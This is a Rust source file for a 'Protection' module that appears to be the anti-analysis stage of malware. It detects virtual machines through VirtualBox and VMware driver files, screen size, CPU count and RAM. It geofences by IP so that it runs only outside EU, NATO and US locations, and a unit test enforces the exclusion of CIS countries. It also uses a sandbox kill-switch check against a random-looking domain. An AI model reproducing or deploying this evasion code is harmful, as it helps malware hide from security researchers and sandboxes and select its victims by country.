use std::net::{SocketAddr, TcpStream};
use std::path::Path;
use std::process;
use std::time::Duration;

use serde::Deserialize;

const BLOCKED_COUNTRIES: &[&str] = &[
    "AT", "BE", "BG", "HR", "CY", "CZ", "DK", "EE", "FI", "FR",
    "DE", "GR", "HU", "IE", "IT", "LV", "LT", "LU", "MT", "NL",
    "PL", "PT", "RO", "SK", "SI", "ES", "SE",
    "AL", "CA", "IS", "ME", "MK", "NO", "TR", "GB", "US",
];

#[allow(dead_code)]
const ALLOWED_COUNTRIES: &[&str] = &[
    "RU", "BY", "UA", "KZ", "TJ", "UZ", "KG", "AM", "AZ", "GE",
    "MD", "TM",
];

const VM_DRIVERS: &[&str] = &[
    "VBoxGuest.sys",
    "VBoxVideo.sys",
    "VBoxWddm.sys",
    "VBoxSF.sys",
    "VBoxMouse.sys",
    "VBoxService.exe",
    "vmxnet3.sys",
    "vm3d.sys",
    "vmwvxpe.sys",
    "vmmemctl.sys",
    "vmci.sys",
    "vmhgfs.sys",
    "vmvss.sys",
    "pvscsi.sys",
    "vmblock.sys",
];

const VM_DRIVER_DIRS: &[&str] = &[
    r"C:\Windows\System32\drivers",
    r"C:\Windows\System32",
    r"C:\Windows\SysWOW64\drivers",
    r"C:\Windows\SysWOW64",
];

const NETWORK_CHECK_HOST: &str = "8.8.8.8:53";

const MIN_RAM_BYTES: u64 = 4 * 1024 * 1024 * 1024;

#[derive(Deserialize)]
struct IpApiResponse {
    status: String,
    #[serde(rename = "countryCode")]
    country_code: Option<String>,
}

pub struct Protection {
    ip_filter:      bool,
    http_filter:    bool,
    network_filter: bool,
    vm_filter:      bool,
    screen_filter:  bool,
    cpu_filter:     bool,
    ram_filter:     bool,
    http_url:    String,
    ip_api_url:  String,
    timeout_secs: u64,
}

impl Default for Protection {
    fn default() -> Self {
        Self {
            ip_filter:      true,
            http_filter:    true,
            network_filter: true,
            vm_filter:      true,
            screen_filter:  true,
            cpu_filter:     true,
            ram_filter:     true,
            http_url:   String::from("http://jcjaDncjakf.com"),
            ip_api_url: String::from("http://ip-api.com/json/?fields=status,countryCode"),
            timeout_secs: 5,
        }
    }
}

pub struct ProtectionBuilder {
    inner: Protection,
}

impl ProtectionBuilder {
    pub fn new() -> Self {
        Self { inner: Protection::default() }
    }

    pub fn set_ip(mut self, enabled: bool) -> Self {
        self.inner.ip_filter = enabled;
        self
    }

    pub fn set_http(mut self, enabled: bool) -> Self {
        self.inner.http_filter = enabled;
        self
    }

    pub fn set_vm(mut self, enabled: bool) -> Self {
        self.inner.vm_filter = enabled;
        self
    }

    pub fn set_network(mut self, enabled: bool) -> Self {
        self.inner.network_filter = enabled;
        self
    }

    pub fn set_screen(mut self, enabled: bool) -> Self {
        self.inner.screen_filter = enabled;
        self
    }

    pub fn set_cpu(mut self, enabled: bool) -> Self {
        self.inner.cpu_filter = enabled;
        self
    }

    pub fn set_ram(mut self, enabled: bool) -> Self {
        self.inner.ram_filter = enabled;
        self
    }

    pub fn http_url(mut self, url: impl Into<String>) -> Self {
        self.inner.http_url = url.into();
        self
    }

    pub fn ip_api_url(mut self, url: impl Into<String>) -> Self {
        self.inner.ip_api_url = url.into();
        self
    }

    pub fn timeout(mut self, secs: u64) -> Self {
        self.inner.timeout_secs = secs;
        self
    }

    pub fn init(self) {
        self.inner.run();
    }
}

impl Default for ProtectionBuilder {
    fn default() -> Self {
        Self::new()
    }
}

impl Protection {
    fn run(&self) {
        if self.vm_filter     { self.check_vm();     }
        if self.screen_filter { self.check_screen(); }
        if self.cpu_filter    { self.check_cpu();    }
        if self.ram_filter    { self.check_ram();    }

        if self.network_filter { self.check_network(); }
        if self.ip_filter      { self.check_ip();      }
        if self.http_filter    { self.check_http();    }
    }

    fn check_vm(&self) {
        for dir in VM_DRIVER_DIRS {
            for driver in VM_DRIVERS {
                if Path::new(dir).join(driver).exists() {
                    process::exit(0);
                }
            }
        }
    }

    fn check_screen(&self) {
        #[cfg(windows)]
        {
            use winapi::um::winuser::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
            let w = unsafe { GetSystemMetrics(SM_CXSCREEN) };
            let h = unsafe { GetSystemMetrics(SM_CYSCREEN) };
            if w == 800 && h == 600 {
                process::exit(0);
            }
        }
    }

    fn check_cpu(&self) {
        let cores = std::thread::available_parallelism()
            .map(|n| n.get())
            .unwrap_or(1);
        if cores <= 1 {
            process::exit(0);
        }
    }

    fn check_ram(&self) {
        use sysinfo::System;
        let mut sys = System::new();
        sys.refresh_memory();
        if sys.total_memory() < MIN_RAM_BYTES {
            process::exit(0);
        }
    }

    fn check_network(&self) {
        let addr: SocketAddr = NETWORK_CHECK_HOST
            .parse()
            .expect("Invalid network check address");
        let timeout = Duration::from_secs(self.timeout_secs);
        if TcpStream::connect_timeout(&addr, timeout).is_err() {
            process::exit(0);
        }
    }

    fn check_ip(&self) {
        let agent = self.build_agent();
        let response = match agent.get(&self.ip_api_url).call() {
            Ok(r)  => r,
            Err(_) => return,
        };
        let data: IpApiResponse = match response.into_json() {
            Ok(d)  => d,
            Err(_) => return,
        };
        if data.status != "success" {
            return;
        }
        if let Some(code) = data.country_code {
            if BLOCKED_COUNTRIES.contains(&code.as_str()) {
                process::exit(0);
            }
        }
    }

    fn check_http(&self) {
        let agent = self.build_agent();
        match agent.get(&self.http_url).call() {
            Ok(r) if r.status() == 200 => process::exit(0),
            _ => {}
        }
    }

    fn build_agent(&self) -> ureq::Agent {
        let t = Duration::from_secs(self.timeout_secs);
        ureq::AgentBuilder::new()
            .timeout_connect(t)
            .timeout_read(t)
            .timeout_write(t)
            .build()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn blocked_countries_not_empty() {
        assert!(!BLOCKED_COUNTRIES.is_empty());
    }

    #[test]
    fn cis_countries_not_blocked() {
        for code in ALLOWED_COUNTRIES {
            assert!(
                !BLOCKED_COUNTRIES.contains(code),
                "Country {code} was incorrectly added to the block list"
            );
        }
    }

    #[test]
    fn us_is_blocked() {
        assert!(BLOCKED_COUNTRIES.contains(&"US"));
    }

    #[test]
    fn vm_drivers_not_empty() {
        assert!(!VM_DRIVERS.is_empty());
    }

    #[test]
    fn vm_drivers_contain_vbox_and_vmware() {
        assert!(VM_DRIVERS.contains(&"VBoxGuest.sys"));
        assert!(VM_DRIVERS.contains(&"VBoxService.exe"));
        assert!(VM_DRIVERS.contains(&"vmxnet3.sys"));
        assert!(VM_DRIVERS.contains(&"vmci.sys"));
        assert!(VM_DRIVERS.contains(&"pvscsi.sys"));
    }

    #[test]
    fn min_ram_is_4gb() {
        assert_eq!(MIN_RAM_BYTES, 4 * 1024 * 1024 * 1024);
    }

    #[test]
    fn disabled_filters_do_not_exit() {
        ProtectionBuilder::new()
            .set_ip(false)
            .set_http(false)
            .set_vm(false)
            .set_network(false)
            .set_screen(false)
            .set_cpu(false)
            .set_ram(false)
            .init();
    }
}
